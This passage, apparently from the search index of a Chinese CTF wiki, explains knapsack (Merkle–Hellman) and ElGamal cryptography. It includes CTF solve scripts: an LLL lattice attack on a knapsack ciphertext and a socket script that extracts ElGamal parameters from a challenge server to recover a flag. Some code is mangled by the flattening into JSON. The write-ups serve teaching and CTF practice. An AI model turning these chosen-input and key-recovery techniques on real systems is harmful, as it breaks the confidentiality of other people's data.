\u8fd9\u6837\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u521d\u59cb\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u79c1\u94a5\uff0c\u53d8\u6362\u540e\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u516c\u94a5\uff0c\u518d\u7a0d\u5fae\u6539\u52a8\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5373\u53ef\u3002  \u8fd9\u91cc\u867d\u7136\u8bf4\u4e86\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u8bf4\u662f\u5982\u4f55\u751f\u6210\u7684\u3002", 
            "title": "\u80cc\u5305\u95ee\u9898"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#merklehellman", 
            "text": "", 
            "title": "Merkle\u2013Hellman"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_2", 
            "text": "", 
            "title": "\u516c\u79c1\u94a5\u751f\u6210"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_3", 
            "text": "\u79c1\u94a5\u5c31\u662f\u6211\u4eec\u7684\u521d\u59cb\u7684\u80cc\u5305\u96c6\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u600e\u4e48\u751f\u6210\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe  a_1=1 a_1=1 \uff0c\u90a3\u4e48  a_2 a_2  \u5927\u4e8e 1 \u5373\u53ef\uff0c\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4f9d\u6b21\u751f\u6210\u540e\u9762\u7684\u503c\u3002", 
            "title": "\u751f\u6210\u79c1\u94a5"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_4", 
            "text": "\u5728\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4e3b\u8981\u4f7f\u7528\u4e86\u6a21\u4e58\u7684\u8fd0\u7b97\u3002  \u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u6a21\u4e58\u7684\u6a21\u6570 m\uff0c\u8fd9\u91cc\u8981\u786e\u4fdd   \nm \\sum_{i=1}^{i=n}a_i  \nm>\\sum_{i=1}^{i=n}a_i   \u5176\u6b21\uff0c\u6211\u4eec\u9009\u62e9\u6a21\u4e58\u7684\u4e58\u6570 w\uff0c\u4f5c\u4e3a\u79c1\u94a5\u5e76\u4e14\u786e\u4fdd   \ngcd(w,m)=1  \ngcd(w,m)=1   \u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u751f\u6210\u516c\u94a5   \nb_i \\equiv w a_i \\bmod m  \nb_i \\equiv w a_i \\bmod m   \u5e76\u5c06\u8fd9\u4e2a\u65b0\u7684\u80cc\u5305\u96c6  b_i b_i  \u548c m \u4f5c\u4e3a\u516c\u94a5\u3002", 
            "title": "\u751f\u6210\u516c\u94a5"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_5", 
            "text": "", 
            "title": "\u52a0\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_6", 
            "text": "\u5047\u8bbe\u6211\u4eec\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a v\uff0c\u5176\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e3a  v_i v_i \uff0c\u90a3\u4e48\u6211\u4eec\u52a0\u5bc6\u7684\u7ed3\u679c\u4e3a   \n\\sum_{i=1}^{i=n}b_iv_i \\bmod m  \n\\sum_{i=1}^{i=n}b_iv_i \\bmod m", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_7", 
            "text": "\u5bf9\u4e8e\u89e3\u5bc6\u65b9\uff0c\u9996\u5148\u53ef\u4ee5\u6c42\u7684 w \u5173\u4e8e m \u7684\u9006\u5143  w^{-1} w^{-1} \u3002  \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4e58\u4ee5  w^{-1} w^{-1}  \u5373\u53ef\u5f97\u5230\u660e\u6587\uff0c\u8fd9\u662f\u56e0\u4e3a   \n\\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m  \n\\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m   \u8fd9\u91cc\u6709   \nb_i \\equiv w a_i \\bmod m  \nb_i \\equiv w a_i \\bmod m   \u5bf9\u4e8e\u6bcf\u4e00\u5757\u7684\u52a0\u5bc6\u7684\u6d88\u606f\u90fd\u662f\u5c0f\u4e8e m \u7684\uff0c\u6240\u4ee5\u6c42\u5f97\u7ed3\u679c\u81ea\u7136\u4e5f\u5c31\u662f\u660e\u6587\u4e86\u3002", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_8", 
            "text": "\u8be5\u52a0\u5bc6\u4f53\u5236\u5728\u63d0\u51fa\u540e\u4e24\u5e74\u540e\u8be5\u4f53\u5236\u5373\u88ab\u7834\u8bd1\uff0c\u7834\u8bd1\u7684\u57fa\u672c\u601d\u60f3\u662f\u6211\u4eec\u4e0d\u4e00\u5b9a\u8981\u627e\u51fa\u6b63\u786e\u7684\u4e58\u6570 w\uff08\u5373\u9677\u95e8\u4fe1\u606f\uff09\uff0c\u53ea\u9700\u627e\u51fa\u4efb\u610f\u6a21\u6570  m\u2032  \u548c\u4e58\u6570  w\u2032 \uff0c\u53ea\u8981\u4f7f\u7528  w\u2032  \u53bb\u4e58\u516c\u5f00\u7684\u80cc\u5305\u5411\u91cf B \u65f6\uff0c\u80fd\u591f\u4ea7\u751f\u8d85\u9012\u589e\u7684\u80cc\u5305\u5411\u91cf\u5373\u53ef\u3002", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_9", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 2014 \u5e74 ASIS Cyber Security Contest Quals \u4e2d\u7684 Archaic \u4e3a\u4f8b\uff0c \u9898\u76ee\u94fe\u63a5 \u3002  \u9996\u5148\u67e5\u770b\u6e90\u7a0b\u5e8f  secret   =   CENSORED  msg_bit   =   bin ( int ( secret . encode ( hex ),   16 ))[ 2 :]   \u9996\u5148\u5f97\u5230\u4e86 secret \u7684\u6240\u6709\u4e8c\u8fdb\u5236\u4f4d\u3002  \u5176\u6b21\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u5f97\u5230 keypair\uff0c\u5305\u542b\u516c\u94a5\u4e0e\u79c1\u94a5\u3002  keyPair   =   makeKey ( len ( msg_bit ))   \u4ed4\u7ec6\u5206\u6790 makekey \u51fd\u6570\uff0c\u5982\u4e0b  def   makeKey ( n ): \n     privKey   =   [ random . randint ( 1 ,   4 ** n )] \n     s   =   privKey [ 0 ] \n     for   i   in   range ( 1 ,   n ): \n         privKey . append ( random . randint ( s   +   1 ,   4 ** ( n   +   i ))) \n         s   +=   privKey [ i ] \n     q   =   random . randint ( privKey [ n - 1 ]   +   1 ,   2 * privKey [ n - 1 ]) \n     r   =   random . randint ( 1 ,   q ) \n     while   gmpy2 . gcd ( r ,   q )   !=   1 : \n         r   =   random . randint ( 1 ,   q ) \n     pubKey   =   [   r * w   %   q   for   w   in   privKey   ] \n     return   privKey ,   q ,   r ,   pubKey   \u53ef\u4ee5\u770b\u51fa prikey \u662f\u4e00\u4e2a\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u5e76\u4e14\u5f97\u5230\u7684 q \u6bd4 prikey \u4e2d\u6240\u6709\u6570\u7684\u548c\u8fd8\u8981\u5927\uff0c\u6b64\u5916\u6211\u4eec\u5f97\u5230\u7684 r\uff0c\u6070\u597d\u4e0e q \u4e92\u7d20\uff0c\u8fd9\u4e00\u5207\u90fd\u8868\u660e\u4e86\u8be5\u52a0\u5bc6\u662f\u4e00\u4e2a\u80cc\u5305\u52a0\u5bc6\u3002  \u679c\u7136\u52a0\u5bc6\u51fd\u6570\u5c31\u662f\u5bf9\u4e8e\u6d88\u606f\u7684\u6bcf\u4e00\u4f4d\u4e58\u4ee5\u5bf9\u5e94\u7684\u516c\u94a5\u5e76\u6c42\u548c\u3002  def   encrypt ( msg ,   pubKey ): \n     msg_bit   =   msg \n     n   =   len ( pubKey ) \n     cipher   =   0 \n     i   =   0 \n     for   bit   in   msg_bit : \n         cipher   +=   int ( bit ) * pubKey [ i ] \n         i   +=   1 \n     return   bin ( cipher )[ 2 :]   \u5bf9\u4e8e\u7834\u89e3\u7684\u811a\u672c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528  GitHub  \u4e0a\u7684\u811a\u672c\u3002\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\u3002  import   binascii  # open the public key and strip the spaces so we have a decent array  fileKey   =   open ( pub.Key ,   rb )  pubKey   =   fileKey . read () . replace (   ,   ) . replace ( L ,   ) . strip ( [] ) . split ( , )  nbit   =   len ( pubKey )  # open the encoded message  fileEnc   =   open ( enc.txt ,   rb )  encoded   =   fileEnc . read () . replace ( L ,   )  print   start  # create a large matrix of 0 s (dimensions are public key length +1)  A   =   Matrix ( ZZ ,   nbit   +   1 ,   nbit   +   1 )  # fill in the identity matrix  for   i   in   xrange ( nbit ): \n     A [ i ,   i ]   =   1  # replace the bottom row with your public key  for   i   in   xrange ( nbit ): \n     A [ i ,   nbit ]   =   pubKey [ i ]  # last element is the encoded message  A [ nbit ,   nbit ]   =   - int ( encoded )  res   =   A . LLL ()  for   i   in   range ( 0 ,   nbit   +   1 ): \n     # print solution \n     M   =   res . row ( i ) . list () \n     flag   =   True \n     for   m   in   M : \n         if   m   !=   0   and   m   !=   1 : \n             flag   =   False \n             break \n     if   flag : \n         print   i ,   M \n         M   =   . join ( str ( j )   for   j   in   M ) \n         # remove the last bit \n         M   =   M [: - 1 ] \n         M   =   hex ( int ( M ,   2 ))[ 2 : - 1 ] \n         print   M   \u8f93\u51fa\u4e4b\u540e\u518d\u89e3\u7801\u4e0bf3962643364356664323432323638326331393536383830366130373036316365    import   binascii    binascii . unhexlify ( 415349535f3962643364356664323432323638326331393536383830366130373036316365 )  ASIS_9bd3d5fd2422682c19568806a07061ce   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f97\u5230\u7684 LLL \u653b\u51fb\u5f97\u5230\u7684\u77e9\u9635 res \u7684\u53ea\u5305\u542b 01 \u503c\u7684\u884c\u624d\u662f\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u5bf9\u4e8e\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u4f1a\u5c06\u5176\u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u6bd4\u7279\u4e32\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u53bb\u6389\u5bf9\u5e94\u54ea\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u3002  flag \u662f  ASIS_9bd3d5fd2422682c19568806a07061ce \u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/asymmetric/knapsack/knapsack/#_10", 
            "text": "2017 \u56fd\u8d5b classic", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/", 
            "text": "ElGamal\n\n\n\u6982\u8ff0\n\n\nElGamal\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u662f\u57fa\u4e8e\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u4e8e1984\u5e74\u63d0\u51fa\uff0c\u4e5f\u662f\u4e00\u79cd\u53cc\u94a5\u5bc6\u7801\u4f53\u5236\uff0c\u65e2\u53ef\u4ee5\u7528\u4e8e\u52a0\u5bc6\u53c8\u53ef\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\u3002\n\n\n\u5982\u679c\u6211\u4eec\u5047\u8bbep\u662f\u81f3\u5c11\u662f160\u4f4d\u7684\u5341\u8fdb\u5236\u7d20\u6570\uff0c\n\u5e76\u4e14p-1\u6709\u5927\u7d20\u56e0\u5b50\n\uff0c\u6b64\u5916g\u662f \nZ_p^*\nZ_p^*\n  \u7684\u751f\u6210\u5143\uff0c\u5e76\u4e14 \ny \\in Z_p^*\ny \\in Z_p^*\n  \u3002\u90a3\u4e48\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570x(\n0\\leq x \\leq p-2\n0\\leq x \\leq p-2\n) \uff0c\u6ee1\u8db3\ng^x \\equiv y \\bmod p\ng^x \\equiv y \\bmod p\n \u5728\u7b97\u6cd5\u4e0a\u662f\u56f0\u96be\u7684\uff0c\u8fd9\u91cc\u5c06x\u8bb0\u4e3a\nx=log_gy\nx=log_gy\n \u3002\n\n\n\u57fa\u672c\u539f\u7406\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbeA\u8981\u7ed9B\u53d1\u9001\u6d88\u606fm\u3002\n\n\n\u5bc6\u94a5\u751f\u6210\n\n\n\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b\n\n\n\n\n\u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff0c\u4ee5\u4fbf\u4e8e\u5728\nZ_p\nZ_p\n \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002\n\n\n\u9009\u53d6\nZ_p^*\nZ_p^*\n \u7684\u751f\u6210\u5143g\u3002\n\n\n\u968f\u673a\u9009\u53d6\u6574\u6570k,\n0\\leq k \\leq p-2\n0\\leq k \\leq p-2\n \uff0c\u5e76\u8ba1\u7b97\ng^k \\equiv y \\bmod p\ng^k \\equiv y \\bmod p\n \u3002\n\n\n\n\n\u5176\u4e2d\u79c1\u94a5\u4e3a{k}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002\n\n\n\u52a0\u5bc6\n\n\nA\u9009\u53d6\u968f\u673a\u6570\nr \\in Z_{p-1}\nr \\in Z_{p-1}\n \uff0c\u5bf9\u660e\u6587\u52a0\u5bc6\nE_k(m,r)=(y_1,y_2)\nE_k(m,r)=(y_1,y_2)\n \u3002\u5176\u4e2d\ny_1 \\equiv g^r \\bmod p\ny_1 \\equiv g^r \\bmod p\n \uff0c\ny_2 \\equiv my^r \\bmod p\ny_2 \\equiv my^r \\bmod p\n \u3002\n\n\n\u89e3\u5bc6\n\n\nD_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p\nD_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p\n \u3002\n\n\n\u96be\u70b9\n\n\n\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86y1,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684r\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74 MMA-CTF-2015\u4e2d\u7684Alicegame\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u9898\u6700\u521d\u5728\u6ca1\u6709\u7ed9\u51fa\u6e90\u7801\u7684\u65f6\u5019\u5374\u662f\u6bd4\u8f83\u96be\u505a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ed9\u4e00\u4e2am\uff0c\u7ed9\u4e00\u4e2ar\u5c31\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff0c\uff0c\u8fd9\u592a\u96be\u60f3\u3002\n\n\n\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u6e90\u7801\uff0c\u9996\u5148\u7a0b\u5e8f\u6700\u521d\u751f\u6210\u4e86pk\u4e0esk\n\n\n    \n(\npk\n,\n \nsk\n)\n \n=\n \ngenkey\n(\nPBITS\n)\n\n\n\n\n\n\u5176\u4e2dgenkey\u51fd\u6570\u5982\u4e0b\n\n\ndef\n \ngenkey\n(\nk\n):\n\n    \np\n \n=\n \ngetPrime\n(\nk\n)\n\n    \ng\n \n=\n \nrandom\n.\nrandrange\n(\n2\n,\n \np\n)\n\n    \nx\n \n=\n \nrandom\n.\nrandrange\n(\n1\n,\n \np\n-\n1\n)\n\n    \nh\n \n=\n \npow\n(\ng\n,\n \nx\n,\n \np\n)\n\n    \npk\n \n=\n \n(\np\n,\n \ng\n,\n \nh\n)\n\n    \nsk\n \n=\n \n(\np\n,\n \nx\n)\n\n    \nreturn\n \n(\npk\n,\n \nsk\n)\n\n\n\n\n\np\u4e3ak\u4f4d\u7684\u7d20\u6570\uff0cg\u4e3a(2,p)\u8303\u56f4\u5185\u7684\u4e66\uff0cx\u5728(1,p-1)\u8303\u56f4\u5185\u3002\u5e76\u4e14\u8ba1\u7b97\u4e86\nh \\equiv g^x \\bmod p\nh \\equiv g^x \\bmod p\n \u3002\u770b\u5230\u8fd9\u91cc\uff0c\u5dee\u4e0d\u591a\u5c31\u77e5\u9053\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u57df\u4e0a\u7684ElGamal\u52a0\u5bc6\u4e86\u3002\u5176\u4e2dpk\u4e3a\u516c\u94a5\uff0csk\u4e3a\u79c1\u94a5\u3002\n\n\n\u63a5\u4e0b\u6765 \u7a0b\u5e8f\u8f93\u51fa\u4e8610\u6b21m\u548cr\u3002\u5e76\u4e14\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u52a0\u5bc6\n\n\ndef\n \nencrypt\n(\npk\n,\n \nm\n,\n \nr\n \n=\n \nNone\n):\n\n    \n(\np\n,\n \ng\n,\n \nh\n)\n \n=\n \npk\n\n    \nif\n \nr\n \nis\n \nNone\n:\n\n        \nr\n \n=\n \nrandom\n.\nrandrange\n(\n1\n,\n \np\n-\n1\n)\n\n    \nc1\n \n=\n \npow\n(\ng\n,\n \nr\n,\n \np\n)\n\n    \nc2\n \n=\n \n(\nm\n \n*\n \npow\n(\nh\n,\n \nr\n,\n \np\n))\n \n%\n \np\n\n    \nreturn\n \n(\nc1\n,\n \nc2\n)\n\n\n\n\n\n\u5176\u52a0\u5bc6\u65b9\u6cd5\u786e\u5b9e\u662fElGamal\u65b9\u5f0f\u7684\u52a0\u5bc6\u3002\n\n\n\u6700\u540e\u7a0b\u5e8f\u5bf9flag\u8fdb\u884c\u4e86\u52a0\u5bc6\u3002\u6b64\u65f6\u7684r\u662f\u7531\u7a0b\u5e8f\u81ea\u5df1random\u7684\u3002\n\n\n\u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u5728\u5341\u8f6e\u5faa\u73af\u4e2d\u53ef\u4ee5\u63a7\u5236m\u548cr\uff0c\u5e76\u4e14\n\n\nc_1 \\equiv g^r \\bmod p\nc_1 \\equiv g^r \\bmod p\n\n\nc_2 \\equiv m * h^{r} \\bmod p\nc_2 \\equiv m * h^{r} \\bmod p\n\n\n\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\n\n\n\n\nr=1\uff0cm=1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\nc_1=g,c_2=h\nc_1=g,c_2=h\n \u3002\n\n\nr=1\uff0cm=-1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\nc_1=g, c_2 = p-h\nc_1=g, c_2 = p-h\n \u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u7d20\u6570p\u3002\n\n\n\n\n\u6211\u4eec\u5f97\u5230\u7d20\u6570p\u6709\u4ec0\u4e48\u7528\u5462?p\u7684\u4f4d\u6570\u5728201\u4f4d\u5de6\u53f3\uff0c\u5f88\u5927\u554a\u3002\n\n\n\u4f46\u662f\u554a\uff0c\u5b83\u751f\u6210\u7d20\u6570p\u4e4b\u540e\uff0c\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u554a\u3002\u6211\u4eec\u5728\u4e4b\u524d\u8bf4\u8fc7p-1\u5fc5\u987b\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u5982\u679c\u6709\u5c0f\u7684\u7d20\u56e0\u5b50\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u4e86\u3002\u5176\u653b\u51fb\u4e3b\u8981\u662f\u4f7f\u7528\u5230\u4e86baby step-giant step \u4e0e Pohlig-Hellman algorithm \u7b97\u6cd5\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u770b\uff0c\u8fd9\u91ccsage\u672c\u8eab\u81ea\u5e26\u7684\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u7684\u51fd\u6570\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u8fd9\u6837\u7684\u60c5\u51b5\u4e86\uff0c\u53c2\u89c1\ndiscrete_log\n \u3002\n\n\n\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u8fd9\u4e2a\u6d88\u8017\u5185\u5b58\u6bd4\u8f83\u5927\uff0c\uff0c\u4e0d\u8981\u968f\u4fbf\u62ff\u865a\u62df\u673a\u8dd1\u3002\u3002\u3002\u8fd8\u6709\u5c31\u662f\u8fd9\u5c3c\u739b\u4ea4\u4e92\u8ba9\u6211\u5934\u75bc\u554a\uff0c\uff0c\uff0c\n\n\nimport\n \nsocket\n\n\nfrom\n \nCrypto.Util.number\n \nimport\n \n*\n\n\nfrom\n \nsage.all\n \nimport\n \n*\n\n\n\n\ndef\n \nget_maxfactor\n(\nN\n):\n\n    \nf\n \n=\n \nfactor\n(\nN\n)\n\n    \nprint\n \nfactor done\n\n    \nreturn\n \nf\n[\n-\n1\n][\n0\n]\n\n\n\nmaxnumber\n \n=\n \n1\n \n \n70\n\n\ni\n \n=\n \n0\n\n\nwhile\n \n1\n:\n\n    \nprint\n \ncycle: \n,\ni\n\n    \nsock\n \n=\n \nsocket\n.\nsocket\n(\nsocket\n.\nAF_INET\n,\n \nsocket\n.\nSOCK_STREAM\n)\n\n    \nsock\n.\nconnect\n((\nlocalhost\n,\n \n9999\n))\n\n    \nsock\n.\nrecv\n(\n17\n)\n\n    \n# get g,h\n\n    \nsock\n.\nrecv\n(\n512\n)\n\n    \nsock\n.\nsendall\n(\n1\n\\n\n)\n\n    \nsock\n.\nrecv\n(\n512\n)\n\n    \nsock\n.\nsendall\n(\n1\n\\n\n)\n\n    \ndata\n \n=\n \nsock\n.\nrecv\n(\n1024\n)\n\n    \nprint\n \ndata\n\n    \nif\n \n\\n\n \nin\n \ndata\n:\n\n        \ndata\n \n=\ndata\n[:\ndata\n.\nindex\n(\n\\n\n)]\n\n    \nelse\n:\n\n        \n# receive m=\n\n        \nsock\n.\nrecv\n(\n1024\n)\n\n    \n(\ng\n,\nh\n)\n \n=\n \neval\n(\ndata\n)\n\n\n    \n# get g,p\n\n    \nsock\n.\nsendall\n(\n-1\n\\n\n)\n\n    \nsock\n.\nrecv\n(\n512\n)\n\n    \nsock\n.\nsendall\n(\n1\n\\n\n)\n\n    \ndata\n \n=\n \nsock\n.\nrecv\n(\n1024\n)\n\n    \nprint\n \ndata\n\n    \nif\n \n\\n\n \nin\n \ndata\n:\n\n        \ndata\n \n=\n \ndata\n[:\ndata\n.\nindex\n(\n\\n\n)]\n\n    \nelse\n:\n\n        \n# receive m=\n\n        \nsock\n.\nrecv\n(\n512\n)\n\n    \n(\ng\n,\ntmp\n)\n \n=\n \neval\n(\ndata\n)\n\n    \np\n \n=\n \ntmp\n+\nh\n\n    \ntmp\n \n=\n \nget_maxfactor\n(\np\n-\n1\n)\n\n    \nif\n \ntmp\nmaxnumber\n:\n\n        \nprint\n \nmay be success\n\n        \n# skip the for cycle\n\n        \nsock\n.\nsendall\n(\nquit\n\\n\n);\n\n        \ndata\n \n=\n \nsock\n.\nrecv\n(\n1024\n)\n\n        \nprint\n \nreceive data: \n,\ndata\n\n        \ndata\n \n=\n \ndata\n[\ndata\n.\nindex\n(\n:\n)\n+\n1\n:]\n\n        \n(\nc1\n,\nc2\n)\n=\neval\n(\ndata\n)\n\n        \n# generate the group\n\n        \ng\n \n=\n \nMod\n(\ng\n,\n \np\n)\n\n        \nh\n \n=\n \nMod\n(\nh\n,\n \np\n)\n\n        \nc1\n \n=\n \nMod\n(\nc1\n,\n \np\n)\n\n        \nc2\n \n=\n \nMod\n(\nc2\n,\n \np\n)\n\n        \nx\n \n=\n \ndiscrete_log\n(\nh\n,\n \ng\n)\n\n        \nprint\n \nx = \n,\n \nx\n\n        \nprint\n \nFlag: \n,\n \nlong_to_bytes\n(\nlong\n(\nc2\n \n/\n \n(\n \nc1\n \n**\n \nx\n)))\n\n    \nsock\n.\nsendall\n(\nquit\n\\n\n)\n\n    \nsock\n.\nrecv\n(\n1024\n)\n\n    \nsock\n.\nclose\n()\n\n    \ni\n \n+=\n \n1\n\n\n\n\n\n\u6700\u540e\u8feb\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u4e0d\u591f\uff0c\uff0c\u6ca1\u8ba1\u7b97\u51fa\u6765\uff0c\uff0c\uff0c\u6709\u65f6\u5019\u4f1a\u5d29\uff0c\u591a\u8fd0\u884c\u51e0\u6b21\u3002\u3002\n\n\nECC\n\n\n\u6982\u8ff0\n\n\nECC\u5168\u79f0\u4e3a\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\uff0cEllipseCurve Cryptography\uff0c\u662f\u4e00\u79cd\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u6570\u5b66\u7684\u516c\u94a5\u5bc6\u7801\u3002\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u5927\u8d28\u6570\u56e0\u5b50\u5206\u89e3\u56f0\u96be\u6027\u7684\u52a0\u5bc6\u65b9\u6cd5\u4e0d\u540c\uff0cECC\u4f9d\u8d56\u4e8e\u89e3\u51b3\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\u3002\u5b83\u7684\u4f18\u52bf\u4e3b\u8981\u5728\u4e8e\u76f8\u5bf9\u4e8e\u5176\u5b83\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5728\u4f7f\u7528\u8f83\u77ed\u5bc6\u94a5\u957f\u5ea6\u7684\u540c\u65f6\u4fdd\u6301\u76f8\u540c\u7684\u5bc6\u7801\u5f3a\u5ea6\u3002\u76ee\u524d\u692d\u5706\u66f2\u7ebf\u4e3b\u8981\u91c7\u7528\u7684\u6709\u9650\u57df\u6709\n\n\n\n\n\u4ee5\u7d20\u6570\u4e3a\u6a21\u7684\u6574\u6570\u57dfGF(p)\uff0c\u901a\u5e38\u5728\u901a\u7528\u5904\u7406\u5668\u4e0a\u66f4\u4e3a\u6709\u6548\u3002\n\n\n\u7279\u5f81\u4e3a2\u7684\u4f3d\u7f57\u534e\u57dfGF\uff082^m\uff09\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u4e13\u95e8\u7684\u786c\u4ef6\u3002\n\n\n\n\n\u57fa\u672c\u77e5\u8bc6\n\n\n\u6211\u4eec\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\uff0c\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\u662f\u6307\u5728\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\u5f0f\n\n\ny^2+axy+by=x^3+cx^2+dx+e\ny^2+axy+by=x^3+cx^2+dx+e\n\n\n\u4e2d\u6240\u6709\u7684\u7cfb\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u6709\u9650\u57dfGF(p)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u4e2dp\u4e3a\u4e00\u4e2a\u5927\u7d20\u6570\u3002\n\n\n\u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u692d\u5706\u66f2\u7ebf\u90fd\u9002\u5408\u4e8e\u52a0\u5bc6\uff0c\u6700\u4e3a\u5e38\u7528\u7684\u65b9\u7a0b\u5982\u4e0b\n\n\ny^2=x^3+ax+b\ny^2=x^3+ax+b\n\n\n\u5176\u4e2d\n4a^3+27b^2 \\bmod p \\neq 0\n4a^3+27b^2 \\bmod p \\neq 0\n\n\n\u6211\u4eec\u79f0\u8be5\u65b9\u7a0b\u7684\u6240\u6709\u89e3(x,y)\uff0c(\nx\\in Fp , y \\in Fp\nx\\in Fp , y \\in Fp\n)\uff0c\u4ee5\u53ca\u4e00\u4e2a\u79f0\u4e3a\u201c\u65e0\u7a77\u8fdc\u70b9\u201d(O)\u7ec4\u6210\u7684\u96c6\u5408\u4e3a\u5b9a\u4e49\u5728Fp\u4e0a\u7684\u4e00\u4e2a\u692d\u5706\u66f2\u7ebf\uff0c\u8bb0\u4e3aE(Fp)\u3002 